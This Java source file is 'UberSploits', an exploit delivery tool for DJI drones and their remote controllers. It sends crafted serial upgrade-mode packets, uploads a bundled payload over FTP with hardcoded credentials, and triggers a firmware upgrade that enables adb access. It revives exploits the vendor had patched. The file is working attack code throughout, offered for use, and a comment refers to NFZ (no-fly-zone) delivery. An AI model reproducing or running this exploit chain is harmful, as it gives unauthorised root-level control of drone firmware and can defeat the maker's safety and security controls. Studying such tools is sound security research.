package com.cunninglogic.ubersploits;

import com.fazecast.jSerialComm.SerialPort;
import org.apache.commons.net.ftp.FTPClient;

import java.io.*;
import java.nio.ByteBuffer;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class Main {
    private static SerialPort activePort;

    private static ClassLoader classLoader;

    private static FTPClient ftpClient;

    public static void main(String[] args) {
        System.out.println("UberSploits v0.2 by jcase,validev");
	    System.out.println("Please see licensing details for the libraries we use inside the libs directory.\n");

        System.out.println("UberSploits is an exploit delivery tool for DJI, it effectively brings back to life a bunch" +
                " of exploits they patched. I mean we didn't even a new vuln lol. Racer, T&F, DontForget all still work.\n");

        System.out.println("This build comes packed with Tar & Feather from jan2642 and hostile. Much thanks to hdnes, Dan " +
                "and jezzab for letting me bounce ideas off of them. I can't believe all this still works.\n");


        System.out.println("All donations go to support local charities (local to me, jcase).");
        System.out.println("PayPal Donations - > jcase@cunninglogic.com");
        System.out.println("Bitcoin Donations - > 1LrunXwPpknbgVYcBJyDk6eanxTBYnyRKN");
        System.out.println("Bitcoin Cash Donations - > 1LrunXwPpknbgVYcBJyDk6eanxTBYnyRKN");
        System.out.println("Amazon giftcards, plain thank yous or anything else -> jcase@cunninglogic.com");

        classLoader = Main.class.getClassLoader();


        System.out.println("\nChoose target:");
        System.out.println("\t[1] Aircraft (e.g. Mavic Pro)");
        System.out.println("\t[2] Remote Control (e.g. Mavic Pro RC)");
        String str = "";        
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        
        int target;
        System.out.print("Choose target: ");
        while (true) {
            try {
                str = br.readLine();
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {

                target = Integer.parseInt(str.trim());

                if ((target > 2) || (target < 1)) {
                    System.out.println("[!] Invalid target selection");
                    System.out.print("Choose target: ");
                } else {
                    System.out.println("Using Target: " + target);
                    break;
                }
            } catch (NumberFormatException e) {
                System.out.println("[!] Invalid target selection");
                System.out.print("Choose target: ");
            }
        }


        int count = 1;
        System.out.println("\nChoose target port: (* suggested port)");
        for (SerialPort s : SerialPort.getCommPorts()) {
            if (s.getDescriptivePortName().contains("DJI")) {
                System.out.print("*");
            }

            System.out.println("\t[" + count + "] " + s.getSystemPortName() + " : " + s.getDescriptivePortName());
            count++;
        }

        System.out.println("\t[E] Exit");

        int port;
        br = new BufferedReader(new InputStreamReader(System.in));
        System.out.print("Choose port: ");
        while (true) {
            try {
                str = br.readLine();
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {

                if (str.toLowerCase().toLowerCase().equals("e")) {
                    System.out.println("Exiting");
                    System.exit(0);
                }


                port = Integer.parseInt(str.trim());

                if ((port > count) || (port < 1)) {
                    System.out.println("[!] Invalid port selection");
                    System.out.print("Choose port: ");
                } else {
                    activePort = SerialPort.getCommPorts()[port - 1];
                    System.out.println("Using Port: " + activePort.getSystemPortName());
                    break;
                }
            } catch (NumberFormatException e) {
                System.out.println("[!] Invalid port selection");
                System.out.print("Choose port: ");
            }
        }

        if (activePort == null) {
            System.out.println("Couldn't find port, exiting");
            System.exit(0);
        }

        if (activePort.isOpen()) {
            System.out.println(activePort.getSystemPortName() + " is already open");
            activePort.closePort(); //meh why not
            System.exit(0);
        }

        if (!activePort.openPort()) {
            System.out.println("Couldn't open port, please close all other DUML/DJI Apps and try again");
            activePort.closePort(); //meh why not
            System.exit(0);
        }

        activePort.setBaudRate(115200);

        System.out.println("\nReading payload ...");

        String payloadfile = "";
        String ftptarget = "";
        switch(target) {
            case 1:	payloadfile = "resources/payload.bin";
                        ftptarget = "upgrade/data_copy.bin";
                        break;
            case 2:	payloadfile = "resources/payloadRC.bin";
                        ftptarget = "upgrade/dji_system.bin";
                        break;
            default:
                        System.out.println("Invalid target. Exiting.");
                        System.exit(0);
        }

        InputStream is = classLoader.getResourceAsStream(payloadfile);
        byte[] payload = null;
        try {
            payload = isToArray(classLoader.getResourceAsStream(payloadfile));
            is.close();

            System.out.println("Entering upgrade mode ...");
            write(UPGRADE_MODE_ENTER(target));

            Thread.sleep(1000);

            if(target==2) {
                System.out.println("Enable reporting ...");
                write(UPGRADE_MODE_ENABLE_REPORTING());

                Thread.sleep(1000);
            }

            System.out.println("Sending filesize ...");
            write(UPGRADE_DATA(target, payload.length));

            Thread.sleep(1000);

            System.out.println("Uploading payload ...");
            ftpClient = new FTPClient();
            ftpClient.connect("192.168.42.2", 21);
            ftpClient.login("dontforget","aboutjcase");
            ftpClient.enterLocalPassiveMode();
            ftpClient.setFileType(ftpClient.BINARY_FILE_TYPE);
            is = classLoader.getResourceAsStream(payloadfile);
            ftpClient.storeFile(ftptarget, is);
            is.close();

            Thread.sleep(1000);

            System.out.println("Executing upgrade ...");
            write(UPGRADE_FINISH_DATA(target, payload));


            Thread.sleep(1000);

            System.out.println("Finished! adb access should be enabled.\n");

            ftpClient.disconnect();
            activePort.closePort();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void write(byte[] packet) throws Exception {
        activePort.writeBytes(packet,packet.length);
        Thread.sleep(1000);
    }

    private static byte[] isToArray(InputStream is) throws IOException {

        ByteArrayOutputStream buffer = new ByteArrayOutputStream();

        int nRead;
        byte[] data = new byte[16384];

        while ((nRead = is.read(data, 0, data.length)) != -1) {
            buffer.write(data, 0, nRead);
        }

        buffer.flush();

        return buffer.toByteArray();
    }

/*
    NFZ delivery, AC
    UPGRADE_MODE_ENTER -       0,HS,28637,55 16 04 FC 2A 28 B8 51 40 00 07 00 00 00 00 00 00 00 00 00 9F BF
    UPGRADE_DATA               0,HS,28831,55 1A 04 B1 2A 28 BB 51 40 00 08 00 C8 57 08 00 00 00 00 00 00 00 02 08 2E 88
    UPGRADE_FINISH_DATA        0,HS,46759,55 1E 04 8A 2A 28 CE 51 40 00 0A 00 A5 1B BF 03 A2 B5 0D F6 DB 1C 5B 28 EF 5D 7A D9 9E 39

    Upgrade delivery, RC
    Change target from 28 to 2D
    change upgrade data mode from 02 08 to 02 04

*/

    private static byte[] UPGRADE_MODE_ENTER(int target) throws Exception {
        byte[] packet;
        switch(target) {
            case 1: 
                packet = new byte[] {0x55,0x16,0x04,(byte)0xFC,0x2A,0x28,(byte)0xB8,0x51,0x40,0x00,0x07,0x00,0x00,0x00,
                    0x00,0x00,0x00,0x00,0x00,0x00};
                break;
            case 2:
                packet = new byte[] {0x55,0x16,0x04,(byte)0xFC,0x2A,0x2D,(byte)0xB8,0x51,0x40,0x00,0x07,0x00,0x00,0x00,
                    0x00,0x00,0x00,0x00,0x00,0x00};
                break;
            default:
                throw new Exception();
        }
        return CRC.pktCRC(packet);
    }
    
    private static byte[] UPGRADE_MODE_ENABLE_REPORTING() {
        byte[] packet = new byte[] {0x55,0x16,0x04,(byte)0xFC,0x2A,0x2D,(byte)0xB8,0x51,0x40,0x00,0x0C,0x00};
        return CRC.pktCRC(packet);
    }

    private static byte[] UPGRADE_DATA(int target, int fileSize) throws Exception {
        byte[] packet;
        switch(target) {
            case 1:
                packet = new byte[] {0x55,0x1A,0x04,(byte)0xB1,0x2A,0x28,(byte)0xBB,0x51,0x40,0x00,0x08,0x00,0x00,0x00,
                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x08};
                break;
            case 2:
                packet = new byte[] {0x55,0x1A,0x04,(byte)0xB1,0x2A,0x2D,(byte)0xBB,0x51,0x40,0x00,0x08,0x00,0x00,0x00,
                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x04};
                break;
            default:
                throw new Exception();
        }
        
        byte[] size = ByteBuffer.allocate(4).putInt(fileSize).array();

        packet[12] = size[3];
        packet[13] = size[2];
        packet[14] = size[1];
        packet[15] = size[0];

        return CRC.pktCRC(packet);
    }

    private static byte[] UPGRADE_FINISH_DATA(int target, byte[] payload) throws Exception {
        byte[] packet;
        switch(target) {
            case 1: 
                packet = new byte[] {0x55,0x1E,0x04,(byte)0x8A,0x2A,0x28,(byte)0xCE,0x51,0x40, 0x00, 0x0A, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                break;
            case 2:
                packet = new byte[] {0x55,0x1E,0x04,(byte)0x8A,0x2A,0x2D,(byte)0xCE,0x51,0x40, 0x00, 0x0A, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                break;
            default:
                throw new Exception();
        }
        byte[] md5 = payload;

        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            md5 = md.digest(md5);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        System.arraycopy(md5,0, packet, 12, 16);
        return CRC.pktCRC(packet);
    }


}
